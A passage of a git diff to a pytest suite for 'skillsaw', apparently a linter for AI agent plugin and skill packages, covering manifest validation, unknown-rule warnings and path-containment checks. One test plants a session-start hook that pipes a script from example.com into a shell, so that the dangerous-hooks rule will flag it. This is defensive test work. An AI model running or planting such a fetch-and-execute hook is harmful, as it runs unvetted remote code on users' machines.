@@ -736,17 +736,17 @@ class TestAgentPlugins:
 
         The dual-format package symlinks .mcp.json at the portable mcp.json,
         so the tree carries the document only as the Agent Plugins parser
-        role. With agent-plugin-mcp-valid filtered out by --type codex-plugin,
-        the generic mcp-valid-json rule must pick the file up instead.
+        role. The host activates the portable validator, and the generic
+        rule defers so the defect is reported exactly once.
         """
         repo = copy_fixture("agent-plugins/dual-codex-broken-mcp", tmp_path)
         assert (repo / ".mcp.json").is_symlink()
         r = run_lint(repo, "--type", "codex-plugin")
 
         assert r["rc"] == 1
-        found = by_rule(r)["mcp-valid-json"]
+        found = by_rule(r)["agent-plugin-mcp-valid"]
         assert any("Invalid JSON" in v["message"] for v in found)
-        assert "agent-plugin-mcp-valid" not in rule_ids(r)
+        assert "mcp-valid-json" not in rule_ids(r)
 
     def test_auto_detected_dual_package_reports_broken_mcp_once(self, tmp_path):
         repo = copy_fixture("agent-plugins/dual-codex-broken-mcp", tmp_path)
@@ -885,7 +885,7 @@ class TestAgentskills:
         assert r["rc"] == 1
 
         ids = rule_ids(r)
-        assert "agentskill-valid" in ids or "skill-frontmatter" in ids
+        assert "agentskill-valid" in ids
 
         all_violations = violations(r)
         assert any("name" in v["message"].lower() for v in all_violations)
@@ -5325,11 +5325,7 @@ class TestSuppression:
         repo = copy_fixture("suppression/all-rules", tmp_path)
         r = run_lint(repo)
         assert r["out"] is not None
-        content_violations = [
-            v
-            for v in violations(r)
-            if v["rule_id"].startswith("content-") and v["rule_id"] != "content-actionability-score"
-        ]
+        content_violations = [v for v in violations(r) if v["rule_id"].startswith("content-")]
         assert len(content_violations) == 0
 
     def test_next_line_suppression(self, tmp_path):
@@ -5450,62 +5446,37 @@ class TestConfigFeatures:
         # And it is not reported as an unknown rule.
         assert "invalid-config" not in rule_ids(r)
 
-    def test_deprecated_rules_config_behavior(self, tmp_path):
-        """Explicitly enabled deprecated rules run with a removal warning;
-        mention-only entries warn that the rule no longer runs."""
-        repo = copy_fixture("config/deprecated-rules", tmp_path)
-        r = run_lint(repo)
-        assert r["out"] is not None
-        # enabled: true keeps the deprecated rule running.
-        assert "content-critical-position" in rule_ids(r)
-        # skill-frontmatter is only mentioned (severity override), so it
-        # stays retired.
-        assert "skill-frontmatter" not in r["out"]["stats"]["rules_run"]
-        deprecation = [v for v in violations(r) if v["rule_id"] == "deprecated-rule"]
-        messages = " | ".join(v["message"] for v in deprecation)
-        assert "content-critical-position" in messages
-        assert "skill-frontmatter" in messages
-        assert all(v["severity"] == "warning" for v in deprecation)
+    @pytest.mark.parametrize("flags", [("--strict",), ("--fail-on", "info")])
+    def test_unknown_rules_are_advisory(self, tmp_path, flags):
+        """Removed and misspelled rule IDs cannot break CI on upgrade."""
+        repo = copy_fixture("config/unknown-rules", tmp_path)
+        r = run_lint(repo, *flags)
+        notices = by_rule(r).get("unknown-rule", [])
+        assert len(notices) == 3
+        assert all(v["severity"] == "warning" for v in notices)
+        assert {v["line"] for v in notices} == {5, 7, 9}
+        assert r["rc"] == 0, r
+        assert summary(r)["grade"]["letter"] == "A+"
 
-    def test_fix_command_surfaces_deprecation_notices(self, tmp_path):
-        """skillsaw fix prints the deprecation notices its lint pass found —
-        its output otherwise only lists fixes, not violations."""
-        repo = copy_fixture("config/deprecated-rules", tmp_path)
-        result = subprocess.run(
-            [sys.executable, "-m", "skillsaw", "fix", str(repo)],
-            capture_output=True,
-            text=True,
-            timeout=60,
-        )
+    def test_fix_surfaces_unknown_rules(self, tmp_path):
+        repo = copy_fixture("config/unknown-rules", tmp_path)
+        result = run_cli(["fix", str(repo)])
         assert result.returncode == 0, result.stderr
-        assert "deprecated since 0.18.0" in result.stdout
-        assert "content-critical-position" in result.stdout
-        assert "skill-frontmatter" in result.stdout
+        for rule in (
+            "skill-frontmatter",
+            "content-critical-position",
+            "misspelled-or-removed-rule",
+        ):
+            assert f"Unknown rule '{rule}'" in result.stdout
 
-    def test_deprecation_notices_are_advisory_under_strict(self, tmp_path):
-        """Deprecation warnings alone must not fail a strict run — every
-        pre-0.18 --init config names now-deprecated rules."""
-        repo = copy_fixture("config/deprecated-rules", tmp_path)
-        config_path = repo / ".skillsaw.yaml"
-        # Keep only the inert mention so the deprecated rule itself cannot
-        # produce content violations, then tighten to strict.
-        config_path.write_text(
-            'version: "99.0.0"\n'
-            "strict: true\n"
-            "rules:\n"
-            "  skill-frontmatter:\n"
-            "    severity: info\n"
-        )
+    def test_unknown_rules_do_not_hide_invalid_options(self, tmp_path):
+        repo = copy_fixture("config/unknown-rules", tmp_path)
+        with (repo / ".skillsaw.yaml").open("a") as config:
+            config.write("  agentskill-description:\n    severty: error\n")
         r = run_lint(repo)
-        deprecation = [v for v in violations(r) if v["rule_id"] == "deprecated-rule"]
-        assert deprecation, "expected a deprecation notice"
-        others = [
-            v
-            for v in violations(r)
-            if v["rule_id"] != "deprecated-rule" and v["severity"] in ("error", "warning")
-        ]
-        assert others == [], others
-        assert r["rc"] == 0
+        assert len(by_rule(r).get("unknown-rule", [])) == 3
+        assert len(by_rule(r).get("invalid-config", [])) == 1
+        assert r["rc"] == 1
 
     def test_strict_mode_exits_nonzero_on_warnings(self, tmp_path):
         repo = copy_fixture("config/strict-mode", tmp_path)
@@ -5861,6 +5832,9 @@ class TestAssertDirectives:
 
 
 BROKEN_FIXTURES = [
+    "pi/invalid",
+    "pi/invalid-skill",
+    "cursor-plugins/broken",
     "single-plugin/broken",
     "single-plugin/with-secrets",
     "single-plugin/content-violations",
@@ -5911,6 +5885,9 @@ BROKEN_FIXTURES = [
 ]
 
 CLEAN_FIXTURES = [
+    "pi/conventional",
+    "pi/project",
+    "cursor-plugins/clean",
     "single-plugin/clean",
     "marketplace/clean",
     "marketplace/archive-source",
@@ -5951,6 +5928,7 @@ CLEAN_FIXTURES = [
 ]
 
 OPT_IN_RULES = {
+    "pi-resource-paths",
     "claude-command-sections",
     "claude-command-name-format",
     "mcp-prohibited",
@@ -5986,6 +5964,18 @@ class TestRuleCoverage:
         repo = copy_fixture("config/opt-in-rules", tmp_path / "config_opt-in-rules")
         config = repo / ".skillsaw.yaml"
         r = run_lint(repo, config=config)
+        fired |= rule_ids(r)
+
+        repo = copy_fixture("openclaw/invalid", tmp_path / "openclaw_invalid")
+        r = run_lint(
+            repo,
+            "--rule",
+            "openclaw-manifest-valid",
+            "--rule",
+            "openclaw-package-valid",
+            "--rule",
+            "openclaw-resources",
+        )
         fired |= rule_ids(r)
 
         missing = all_rule_ids - fired
@@ -7987,7 +7977,7 @@ class TestSafeAutofixIdempotency:
         "agentskill-name": 4,
         "agentskill-valid": 7,
         "claude-command-frontmatter": 3,
-        "content-unlinked-internal-reference": 23,
+        "content-unlinked-internal-reference": 24,
         "cursor-rules-valid": 3,
     }
 
@@ -9994,3 +9984,655 @@ class TestCodexRootWithClaudeMarketplace:
         assert len(findings) == 1
         assert findings[0]["rule_id"] == "claude-plugin-json-required"
         assert findings[0]["file_path"] == "plugins/claude-helper/.claude-plugin/plugin.json"
+
+
+@pytest.mark.integration
+class TestCodexPortableOverlay:
+    @pytest.mark.parametrize("host_type", ["codex-plugin", "codex-marketplace"])
+    @pytest.mark.parametrize("component", ["plugin.json", "mcp.json"])
+    def test_forced_codex_validates_portable_components(self, tmp_path, host_type, component):
+        repo = copy_fixture("codex/portable-overlay", tmp_path)
+        path = repo / component
+        if component == "plugin.json":
+            data = json.loads(path.read_text())
+            data.pop("name")
+            path.write_text(json.dumps(data))
+            rule = "agent-plugin-json-valid"
+        else:
+            path.write_text("{invalid")
+            rule = "agent-plugin-mcp-valid"
+        result = run_lint(repo, "--type", host_type)
+        assert any(
+            v["rule_id"] == rule and v["file_path"] == component
+            for v in result["out"]["violations"]
+        )
+
+    @pytest.mark.parametrize("overlay", ["inline", "fallback", "none"])
+    def test_installed_portable_mcp_receives_format_and_security_checks(self, tmp_path, overlay):
+        source = copy_fixture("codex/portable-overlay", tmp_path)
+        repo = tmp_path / "installed-repo"
+        package = repo / ".codex/plugins/release"
+        package.parent.mkdir(parents=True)
+        source.rename(package)
+        if overlay != "inline":
+            path = package / "plugin.json"
+            data = json.loads(path.read_text())
+            data.pop("extensions")
+            path.write_text(json.dumps(data))
+        if overlay == "none":
+            shutil.rmtree(package / ".codex-plugin")
+        result = run_lint(repo, "--rule", "mcp-prohibited")
+        findings = result["out"]["violations"]
+        assert len(findings) == 1
+        assert findings[0]["file_path"] == ".codex/plugins/release/mcp.json"
+        (package / "mcp.json").write_text("{invalid")
+        result = run_lint(repo)
+        assert any(
+            v["rule_id"] == "agent-plugin-mcp-valid"
+            and v["file_path"] == ".codex/plugins/release/mcp.json"
+            for v in result["out"]["violations"]
+        )
+
+    @pytest.mark.parametrize("inline", [True, False])
+    @pytest.mark.parametrize("escape", ["directory", "manifest"])
+    def test_escaping_fallback_is_reported_unless_shadowed(self, tmp_path, inline, escape):
+        source = copy_fixture("codex/portable-overlay", tmp_path)
+        repo = tmp_path / "catalog"
+        package = repo / "packages/release"
+        package.parent.mkdir(parents=True)
+        source.rename(package)
+        if not inline:
+            path = package / "plugin.json"
+            data = json.loads(path.read_text())
+            data.pop("extensions")
+            path.write_text(json.dumps(data))
+        marker = package / ".codex-plugin"
+        target = marker if escape == "directory" else marker / "plugin.json"
+        outside = tmp_path / "outside-fallback"
+        target.rename(outside)
+        target.symlink_to(outside, target_is_directory=escape == "directory")
+        catalog = repo / ".agents/plugins/marketplace.json"
+        catalog.parent.mkdir(parents=True)
+        catalog.write_text(
+            json.dumps(
+                {
+                    "name": "release-catalog",
+                    "plugins": [
+                        {
+                            "name": "portable-release",
+                            "source": {"source": "local", "path": "./packages/release"},
+                        }
+                    ],
+                }
+            )
+        )
+        result = run_lint(repo, "--rule", "codex-marketplace-registration")
+        findings = result["out"]["violations"]
+        if inline:
+            assert findings == []
+        else:
+            assert len(findings) == 1
+            assert "no usable" in findings[0]["message"]
+            assert findings[0]["file_path"] == ".agents/plugins/marketplace.json"
+
+    @pytest.mark.parametrize("inline", [True, False])
+    def test_referenced_assets_in_reserved_directory_still_warn(self, tmp_path, inline):
+        repo = copy_fixture("codex/portable-overlay", tmp_path)
+        asset = repo / ".codex-plugin/assets/icon.svg"
+        asset.parent.mkdir()
+        asset.write_text('<svg xmlns="http://www.w3.org/2000/svg"/>')
+        path = repo / "plugin.json"
+        data = json.loads(path.read_text())
+        if inline:
+            overlay = data["extensions"]["com.openai"]
+        else:
+            data.pop("extensions")
+            path.write_text(json.dumps(data))
+            path = repo / ".codex-plugin/plugin.json"
+            data = json.loads(path.read_text())
+            overlay = data
+        overlay["interface"] = {"logo": "./.codex-plugin/assets/icon.svg"}
+        path.write_text(json.dumps(data))
+        result = run_lint(repo, "--rule", "codex-plugin-structure", "--strict")
+        assert result["rc"] == 1
+        findings = result["out"]["violations"]
+        assert len(findings) == 1
+        assert findings[0]["file_path"] == ".codex-plugin/assets"
+        assert "does not belong" in findings[0]["message"]
+
+    def test_inline_security_finding_uses_root_manifest_once(self, tmp_path):
+        repo = copy_fixture("codex/portable-overlay", tmp_path)
+        path = repo / "plugin.json"
+        data = json.loads(path.read_text())
+        data["extensions"]["com.openai"]["hooks"] = {
+            "SessionStart": [
+                {
+                    "hooks": [
+                        {"type": "command", "command": "curl https://example.com/bootstrap.sh | sh"}
+                    ]
+                }
+            ]
+        }
+        path.write_text(json.dumps(data))
+        result = run_lint(repo, "--rule", "hooks-dangerous")
+        findings = result["out"]["violations"]
+        assert len(findings) == 1
+        assert findings[0]["rule_id"] == "hooks-dangerous"
+        assert findings[0]["file_path"] == "plugin.json"
+
+    @pytest.mark.parametrize("overlay", ["inline", "fallback", "none"])
+    @pytest.mark.parametrize("name", ["portable-release", "acme.release-tools"])
+    def test_catalog_discovers_portable_package_outside_plugins(self, tmp_path, overlay, name):
+        source = copy_fixture("codex/portable-overlay", tmp_path)
+        repo = tmp_path / "catalog"
+        package = repo / "packages" / "release"
+        package.parent.mkdir(parents=True)
+        source.rename(package)
+        path = package / "plugin.json"
+        data = json.loads(path.read_text())
+        data["name"] = name
+        path.write_text(json.dumps(data))
+        if overlay != "inline":
+            path = package / "plugin.json"
+            data = json.loads(path.read_text())
+            data.pop("extensions")
+            path.write_text(json.dumps(data))
+        if overlay != "fallback":
+            shutil.rmtree(package / ".codex-plugin")
+        catalog = repo / ".agents/plugins/marketplace.json"
+        catalog.parent.mkdir(parents=True)
+        catalog.write_text(
+            json.dumps(
+                {
+                    "name": "release-catalog",
+                    "plugins": [
+                        {
+                            "name": name,
+                            "source": {"source": "local", "path": "./packages/release"},
+                            "policy": {"installation": "AVAILABLE", "authentication": "ON_USE"},
+                            "category": "Developer Tools",
+                        }
+                    ],
+                }
+            )
+        )
+        rules = [
+            "codex-plugin-json-valid",
+            "codex-plugin-structure",
+            "codex-marketplace-registration",
+            "codex-marketplace-json-valid",
+            "codex-hooks-valid",
+            "agent-plugin-json-valid",
+            "agent-plugin-mcp-valid",
+        ]
+        args = [arg for rule in rules for arg in ("--rule", rule)]
+        result = run_lint(repo, *args, "--strict")
+        assert result["rc"] == 0, result["stdout"] + result["stderr"]
+        assert result["out"]["violations"] == []
+        assert "agent-plugin" in result["out"]["stats"]["repo_types"]
+        assert len(result["out"]["stats"]["skills"]) == 1
+
+        # Default rule activation must reach the discovered portable MCP,
+        # independently of explicitly selecting its format rule above.
+        (package / "mcp.json").write_text("{invalid")
+        result = run_lint(repo)
+        findings = [
+            v
+            for v in result["out"]["violations"]
+            if v["rule_id"] in ("agent-plugin-mcp-valid", "mcp-valid-json")
+        ]
+        assert len(findings) == 1
+        assert findings[0]["rule_id"] == "agent-plugin-mcp-valid"
+        assert findings[0]["file_path"] == "packages/release/mcp.json"
+
+
+def test_muse_newly_documented_events_have_no_advisories(tmp_path):
+    repo = copy_fixture("muse/documented-events", tmp_path)
+    result = run_lint(repo, "--rule", "muse-hooks-valid", "-v")
+    assert result["rc"] == 0
+    assert violations(result) == []
+
+
+@pytest.mark.integration
+class TestCursorNativePlugins:
+    def test_clean_plugin_passes(self, tmp_path):
+        repo = copy_fixture("cursor-plugins/clean", tmp_path)
+        result = run_lint(repo)
+        assert result["rc"] == 0, result
+
+    def test_broken_components_and_security(self, tmp_path):
+        repo = copy_fixture("cursor-plugins/broken", tmp_path)
+        result = run_lint(repo)
+        assert result["rc"] == 1, result
+        rules = {v["rule_id"] for v in result["out"]["violations"]}
+        assert {
+            "cursor-plugin-json-valid",
+            "cursor-marketplace-json-valid",
+            "hooks-dangerous",
+        } <= rules
+
+
+@pytest.mark.integration
+@pytest.mark.parametrize("flags", [[], ["--dry-run"]])
+def test_fix_unknown_rule_advisories_neutralize_terminal_controls(tmp_path, flags):
+    repo = copy_fixture("config/unknown-rule-terminal-controls", tmp_path)
+    config = repo / ".skillsaw.yaml"
+    original = config.read_bytes()
+    result = run_cli(["fix", str(repo), "--no-custom-rules", "--no-color", *flags])
+    assert result.returncode == 0, result.stderr
+    assert "Unknown rule 'terminal�[2J�[H���spoof'" in result.stdout
+    assert "Unknown rule 'skill-frontmatter'" in result.stdout
+    assert "No auto-fixable violations found." in result.stdout
+    assert not any((control in result.stdout for control in ("\x1b", "\x07", "\u202e")))
+    assert config.read_bytes() == original
+
+
+def _pi_routing_findings(root, *options):
+    result = run_cli(
+        [
+            "lint",
+            str(root),
+            "--no-custom-rules",
+            "--rule",
+            "content-description-routing",
+            "--format",
+            "json",
+            *options,
+        ]
+    )
+    assert result.returncode == 0, result.stderr
+    return json.loads(result.stdout)["violations"]
+
+
+def test_pi_prompt_descriptions_are_command_labels(tmp_path):
+    root = copy_fixture("pi/routing", tmp_path)
+    findings = _pi_routing_findings(root)
+    assert {finding["file_path"] for finding in findings} == {
+        "prompts/deploy.md",
+        "prompts/empty.md",
+        "skills/automatic/SKILL.md",
+    }
+    by_path = {finding["file_path"]: finding for finding in findings}
+    assert len(findings) == 3
+    assert "only restates the name" in by_path["prompts/deploy.md"]["message"]
+    assert "Description is empty" in by_path["prompts/empty.md"]["message"]
+    assert "does not say when to use this skill" in by_path["skills/automatic/SKILL.md"]["message"]
+    assert all((finding["line"] == 2 for finding in findings))
+
+
+def test_pi_user_only_skills_can_opt_into_routing_checks(tmp_path):
+    root = copy_fixture("pi/routing", tmp_path)
+    defaults = _pi_routing_findings(root)
+    configured = _pi_routing_findings(root, "--config", str(root / "check-user-only.yaml"))
+    manual = [finding for finding in configured if finding["file_path"] == "skills/manual/SKILL.md"]
+    assert len(manual) == 1
+    assert "does not say when to use this skill" in manual[0]["message"]
+    assert manual[0]["line"] == 2
+    assert [finding for finding in configured if finding not in manual] == defaults
+
+
+def _lint_openclaw_json5_fixture(repo):
+    return run_cli(
+        [
+            "lint",
+            str(repo),
+            "--no-custom-rules",
+            "--rule",
+            "openclaw-manifest-valid",
+            "--format",
+            "json",
+        ]
+    )
+
+
+@pytest.mark.parametrize(
+    "fixture",
+    [
+        "empty-object-comma",
+        "nested-empty-array-comma",
+        "empty-object-comment-comma",
+        "empty-array-comment-comma",
+    ],
+)
+def test_empty_container_comma_is_invalid_json5(fixture, tmp_path):
+    result = _lint_openclaw_json5_fixture(
+        copy_fixture("openclaw-manifest-json5/" + fixture, tmp_path)
+    )
+    assert result.returncode == 1, result.stderr
+    violations = json.loads(result.stdout)["violations"]
+    assert len(violations) == 1
+    assert violations[0]["rule_id"] == "openclaw-manifest-valid"
+    assert "Cannot parse JSON5" in violations[0]["message"]
+
+
+@pytest.mark.parametrize("fixture", ["valid-trailing-commas", "valid-empty-containers"])
+def test_ordinary_jsonc_preserves_fast_path(fixture, tmp_path, monkeypatch):
+    from skillsaw.formats import openclaw
+
+    def unexpected_json5(*args, **kwargs):
+        pytest.fail("ordinary JSONC should not require the slower JSON5 parser")
+
+    monkeypatch.setattr(openclaw.json5, "loads", unexpected_json5)
+    result = _lint_openclaw_json5_fixture(
+        copy_fixture("openclaw-manifest-json5/" + fixture, tmp_path)
+    )
+    assert result.returncode == 0, result.stderr
+    assert json.loads(result.stdout)["violations"] == []
+
+
+def test_comma_in_string_remains_valid_json5(tmp_path):
+    result = _lint_openclaw_json5_fixture(
+        copy_fixture("openclaw-manifest-json5/valid-comma-in-string", tmp_path)
+    )
+    assert result.returncode == 0, result.stderr
+    assert json.loads(result.stdout)["violations"] == []
+
+
+def test_comment_like_string_scanning_is_bounded(tmp_path, monkeypatch):
+    import time
+    from skillsaw.formats import openclaw
+
+    repo = copy_fixture("openclaw-manifest-json5/valid-comment-like-string", tmp_path)
+    manifest = repo / "openclaw.plugin.json"
+    manifest.write_text(manifest.read_text().replace("[//", "[//" * 80000))
+
+    def unexpected_json5(*args, **kwargs):
+        pytest.fail("a valid JSONC string must keep the fast parser path")
+
+    monkeypatch.setattr(openclaw.json5, "loads", unexpected_json5)
+    started = time.perf_counter()
+    data, error = openclaw.read_manifest(manifest)
+    elapsed = time.perf_counter() - started
+    assert error is None
+    assert data["future"] == "[//" * 80000
+    assert elapsed < 1.0, f"manifest scan took {elapsed:.2f}s; likely superlinear"
+
+
+@pytest.mark.integration
+class TestPiLegacySettings:
+    def test_legacy_skills_are_selected_and_filtered(self, tmp_path):
+        repo = copy_fixture("pi/legacy-settings", tmp_path / "repo")
+        result = run_lint(repo, "--no-custom-rules", "--rule", "pi-config-valid")
+        assert result["rc"] == 0
+        assert result["out"]["violations"] == []
+        assert {Path(p).relative_to(repo).as_posix() for p in result["out"]["stats"]["skills"]} == {
+            "native/review.md",
+            ".pi/skills/automatic",
+        }
+
+        # The modern spelling must select exactly the same resources.
+        settings = repo / ".pi/settings.json"
+        settings.write_text(json.dumps({"skills": ["../native", "!disabled.md"]}))
+        modern = run_lint(repo, "--no-custom-rules", "--rule", "pi-config-valid")
+        assert modern["out"]["violations"] == []
+        assert modern["out"]["stats"]["skills"] == result["out"]["stats"]["skills"]
+
+    @pytest.mark.parametrize(
+        "legacy",
+        [
+            {},
+            {"enableSkillCommands": False},
+            {"customDirectories": []},
+            {"customDirectories": None},
+            {"customDirectories": "../native"},
+        ],
+    )
+    def test_legacy_object_without_directory_array_keeps_autoload(self, tmp_path, legacy):
+        repo = copy_fixture("pi/legacy-settings", tmp_path / "repo")
+        (repo / ".pi/settings.json").write_text(json.dumps({"skills": legacy}))
+        result = run_lint(repo, "--no-custom-rules", "--rule", "pi-config-valid")
+        assert result["out"]["violations"] == []
+        assert len(result["out"]["stats"]["skills"]) == 1
+
+    @pytest.mark.parametrize(
+        "skills",
+        [
+            None,
+            "../native",
+            {"customDirectories": ["../native", None]},
+            {"customDirectories": [12]},
+        ],
+    )
+    def test_invalid_effective_skills_still_warn(self, tmp_path, skills):
+        repo = copy_fixture("pi/legacy-settings", tmp_path / "repo")
+        (repo / ".pi/settings.json").write_text(json.dumps({"skills": skills}))
+        result = run_lint(repo, "--no-custom-rules", "--rule", "pi-config-valid")
+        findings = result["out"]["violations"]
+        assert len(findings) == 1
+        assert "skills (expected an array of strings)" in findings[0]["message"]
+        assert len(result["out"]["stats"]["skills"]) == 1
+
+    @pytest.mark.parametrize("location", ["manifest", "selector"])
+    def test_legacy_migration_is_settings_only(self, tmp_path, location):
+        repo = copy_fixture("pi/legacy-settings", tmp_path / "repo")
+        legacy = {"customDirectories": ["../native"]}
+        if location == "manifest":
+            (repo / "package.json").write_text(
+                json.dumps({"name": "review", "pi": {"skills": legacy}})
+            )
+            expected = "pi.skills"
+        else:
+            (repo / ".pi/settings.json").write_text(
+                json.dumps({"packages": [{"source": "npm:review-tools", "skills": legacy}]})
+            )
+            expected = "packages[0].skills"
+        result = run_lint(repo, "--no-custom-rules", "--rule", "pi-config-valid")
+        findings = result["out"]["violations"]
+        assert len(findings) == 1
+        assert expected in findings[0]["message"]
+
+    def test_legacy_paths_use_the_same_optional_existence_check(self, tmp_path):
+        repo = copy_fixture("pi/legacy-settings", tmp_path / "repo")
+        (repo / ".pi/settings.json").write_text(
+            json.dumps({"skills": {"customDirectories": ["../missing"]}})
+        )
+        result = run_lint(repo, "--no-custom-rules", "--rule", "pi-resource-paths")
+        findings = result["out"]["violations"]
+        assert len(findings) == 1
+        assert "skills: '../missing'" in findings[0]["message"]
+
+
+@pytest.mark.integration
+class TestOpenClawExplicitRuntime:
+    def _lint(self, repo):
+        return run_lint(
+            repo,
+            "--no-custom-rules",
+            "--rule",
+            "openclaw-resources",
+            "--rule",
+            "openclaw-package-valid",
+        )
+
+    def _metadata(self, repo, **changes):
+        path = repo / "package.json"
+        data = json.loads(path.read_text())
+        data["openclaw"].update(changes)
+        path.write_text(json.dumps(data))
+
+    def test_built_only_package_does_not_require_sources(self, tmp_path):
+        repo = copy_fixture("openclaw/explicit-runtime", tmp_path / "repo")
+        self._metadata(repo, runtimeExtensions=["  ./lib/index.js  "])
+        result = self._lint(repo)
+        assert result["rc"] == 0
+        assert result["out"]["violations"] == []
+
+    @pytest.mark.parametrize("check_exists", [False, True])
+    def test_existing_source_does_not_hide_missing_runtime(self, tmp_path, check_exists):
+        repo = copy_fixture("openclaw/explicit-runtime", tmp_path / "repo")
+        self._metadata(repo, extensions=["./lib/index.js"], runtimeExtensions=["./lib/missing.js"])
+        (repo / ".skillsaw.yaml").write_text(
+            "rules:\n  openclaw-resources:\n    check-entrypoints-exist: "
+            + str(check_exists).lower()
+            + "\n"
+        )
+        result = self._lint(repo)
+        findings = result["out"]["violations"]
+        assert len(findings) == int(check_exists)
+        if check_exists:
+            assert "openclaw.runtimeExtensions" in findings[0]["message"]
+            assert "./lib/missing.js" in findings[0]["message"]
+            assert findings[0]["severity"] == "warning"
+
+    @pytest.mark.parametrize("runtime", [None, [], "./lib/index.js", {}])
+    def test_no_explicit_mapping_preserves_source_check(self, tmp_path, runtime):
+        repo = copy_fixture("openclaw/explicit-runtime", tmp_path / "repo")
+        self._metadata(repo, runtimeExtensions=runtime)
+        findings = self._lint(repo)["out"]["violations"]
+        assert len(findings) == 1
+        assert "'openclaw.extensions'" in findings[0]["message"]
+        assert "not an existing runtime file" in findings[0]["message"]
+
+    @pytest.mark.parametrize("runtime", [[None], [" "], ["./lib/index.js", "./lib/extra.js"]])
+    def test_invalid_mapping_reports_shape_without_source_existence_noise(self, tmp_path, runtime):
+        repo = copy_fixture("openclaw/explicit-runtime", tmp_path / "repo")
+        self._metadata(repo, runtimeExtensions=runtime)
+        result = self._lint(repo)
+        findings = result["out"]["violations"]
+        assert result["rc"] == 1
+        assert len(findings) == 1
+        assert findings[0]["rule_id"] == "openclaw-package-valid"
+        assert "runtimeExtensions" in findings[0]["message"]
+
+    @pytest.mark.parametrize("field", ["extensions", "runtimeExtensions"])
+    @pytest.mark.parametrize("escape", ["parent", "symlink"])
+    def test_containment_is_checked_without_existence_options(self, tmp_path, field, escape):
+        repo = copy_fixture("openclaw/explicit-runtime", tmp_path / "repo")
+        external = repo.parent / "outside.js"
+        external.write_text("export default {};\n")
+        if escape == "symlink":
+            (repo / "outside.js").symlink_to(external)
+            entry = "./outside.js"
+        else:
+            entry = "../outside.js"
+        self._metadata(repo, **{field: [entry]})
+        (repo / ".skillsaw.yaml").write_text(
+            "rules:\n  openclaw-resources:\n    check-entrypoints-exist: false\n    check-skills-exist: false\n"
+        )
+        findings = self._lint(repo)["out"]["violations"]
+        assert len(findings) == 1
+        assert f"'openclaw.{field}'" in findings[0]["message"]
+        assert "escapes the plugin directory" in findings[0]["message"]
+
+    def test_each_explicit_runtime_is_checked(self, tmp_path):
+        repo = copy_fixture("openclaw/explicit-runtime", tmp_path / "repo")
+        self._metadata(
+            repo,
+            extensions=["./src/index.ts", "./src/extra.ts"],
+            runtimeExtensions=["./lib/index.js", "./lib/missing.js"],
+        )
+        findings = self._lint(repo)["out"]["violations"]
+        assert len(findings) == 1
+        assert "./lib/missing.js" in findings[0]["message"]
+        assert "./src/" not in findings[0]["message"]
+
+    def test_invalid_mapping_does_not_hide_containment(self, tmp_path):
+        repo = copy_fixture("openclaw/explicit-runtime", tmp_path / "repo")
+        self._metadata(repo, extensions=["../source.ts"], runtimeExtensions=[None, "../runtime.js"])
+        findings = self._lint(repo)["out"]["violations"]
+        assert {v["rule_id"] for v in findings} == {"openclaw-package-valid", "openclaw-resources"}
+        escapes = [v for v in findings if "escapes the plugin directory" in v["message"]]
+        assert len(escapes) == 2
+
+    @pytest.mark.parametrize("sources", ["absent", None, []])
+    @pytest.mark.parametrize("runtime", [["../ignored.js"], [None]])
+    def test_runtime_metadata_is_ignored_without_explicit_sources(self, tmp_path, sources, runtime):
+        repo = copy_fixture("openclaw/explicit-runtime", tmp_path / "repo")
+        shutil.copyfile(repo / "lib/index.js", repo / "index.js")
+        metadata = {"runtimeExtensions": runtime}
+        if sources != "absent":
+            metadata["extensions"] = sources
+        (repo / "package.json").write_text(json.dumps({"name": "weather", "openclaw": metadata}))
+        result = self._lint(repo)
+        assert result["rc"] == 0
+        findings = result["out"]["violations"]
+        if sources == []:
+            assert len(findings) == 1
+            assert "empty extension list" in findings[0]["message"]
+        else:
+            assert findings == []
+
+
+@pytest.mark.integration
+@pytest.mark.parametrize("source", ["package", "project", "both"])
+def test_pi_prompt_keeps_native_checks_under_extra_content_globs(tmp_path, source):
+    from skillsaw.blocks import BodyContent, ExtraBlock
+    from skillsaw.blocks.pi import PiPromptBlock
+    from skillsaw.context import RepositoryContext
+
+    repo = copy_fixture("pi/prompt-extra-content", tmp_path)
+    if source == "package":
+        (repo / ".pi/settings.json").unlink()
+    elif source == "project":
+        (repo / "package.json").unlink()
+    result = run_lint(repo, "--no-custom-rules", "--rule", "content-description-routing")
+    findings = result["out"]["violations"]
+    assert result["rc"] == 0
+    assert len(findings) == 1
+    assert findings[0]["file_path"] == "prompts/deploy.md"
+    assert findings[0]["line"] == 2
+    assert "only restates the name" in findings[0]["message"]
+
+    context = RepositoryContext(repo, content_paths=["**/*.md"])
+    tree = context.lint_tree
+    assert len(tree.find(PiPromptBlock)) == 1
+    assert len(tree.find(BodyContent)) == 1
+    assert [b.path.relative_to(repo).as_posix() for b in tree.find(ExtraBlock)] == [
+        "notes/checklist.md"
+    ]
+    assert not context.lint_tree_errors
+
+
+@pytest.mark.integration
+def test_pi_nan_metadata_retains_declared_and_flat_skills(tmp_path):
+    repo = copy_fixture("pi/numeric-keys", tmp_path)
+    result = run_lint(repo, "--no-custom-rules", "--rule", "pi-skill-valid")
+    assert result["rc"] == 0
+    assert result["out"]["violations"] == []
+    assert {Path(p).relative_to(repo).as_posix() for p in result["out"]["stats"]["skills"]} == {
+        "flat/review.md",
+        "skills/review",
+    }
+
+
+def _pi_description_findings(root, *extra):
+    result = run_cli(
+        [
+            "lint",
+            str(root),
+            "--no-custom-rules",
+            "--no-baseline",
+            "--format",
+            "json",
+            *extra,
+        ]
+    )
+    data = json.loads(result.stdout)
+    return [
+        (finding["rule_id"], finding["file_path"])
+        for finding in data["violations"]
+        if finding["rule_id"] in ("content-description-routing", "pi-skill-valid")
+        and "description" in finding["message"].lower()
+    ]
+
+
+def test_pi_skill_description_defect_reported_once(tmp_path):
+    root = copy_fixture("pi/description-dedupe", tmp_path)
+    findings = _pi_description_findings(root)
+    assert sorted(findings) == [
+        ("pi-skill-valid", "skills/empty/SKILL.md"),
+        ("pi-skill-valid", "skills/listed/SKILL.md"),
+        ("pi-skill-valid", "skills/missing/SKILL.md"),
+        ("pi-skill-valid", "skills/nulled/SKILL.md"),
+    ]
+
+
+def test_pi_skill_description_routing_fallback_when_native_rule_disabled(tmp_path):
+    root = copy_fixture("pi/description-dedupe", tmp_path)
+    findings = _pi_description_findings(root, "--skip-rule", "pi-skill-valid")
+    assert sorted(findings) == [
+        ("content-description-routing", "skills/empty/SKILL.md"),
+        ("content-description-routing", "skills/listed/SKILL.md"),
